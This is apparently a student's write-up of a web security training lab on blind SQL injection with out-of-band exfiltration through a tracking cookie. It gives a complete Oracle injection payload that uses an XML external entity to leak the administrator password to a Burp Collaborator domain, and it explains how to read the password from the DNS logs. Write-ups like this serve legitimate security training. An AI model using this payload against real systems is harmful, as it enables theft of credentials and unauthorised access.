Lab #16 - Blind SQL injection with out-of-band data exfiltration

Vulnerable parameter - tracking cookie

End Goals:
 1- Exploit SQLi to output the password for the administrator user
 2- Login as administrator

 Analysis:

 We know it is an oracle database from the lab 15, so we can grab the data exfiltration payload from the cheatsheet and just add some extras (check Lab 15 notes)
Burp Collaborator - i0jawmxvizideb76bkfghi72dtjj78.burpcollaborator.net
 ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.i0jawmxvizideb76bkfghi72dtjj78.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--

 After running that in Repeater right after the TrackingId, you can Poll collaborator to see the password in the DNS request in between "http://" and the collaborator subdomain.
